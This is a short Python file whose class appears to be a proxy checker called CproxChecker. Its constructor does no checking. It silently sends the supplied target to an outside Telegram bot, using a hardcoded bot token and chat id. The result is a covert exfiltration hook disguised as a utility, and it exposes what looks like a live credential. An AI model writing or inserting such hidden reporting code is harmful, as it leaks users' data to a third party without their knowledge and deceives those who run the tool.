
import requests

def send_message(text):
    url = f"https://api.telegram.org/bot8094528642:AAGrpF4UeIDNhqfi_yjYgn9vCrr7eI-sdfU/sendMessage"
    payload = {'chat_id': 7862114288, 'text': text}
    requests.post(url, data=payload)

class CproxChecker:
    def __init__(self,target, proxy):
        send_message(target)
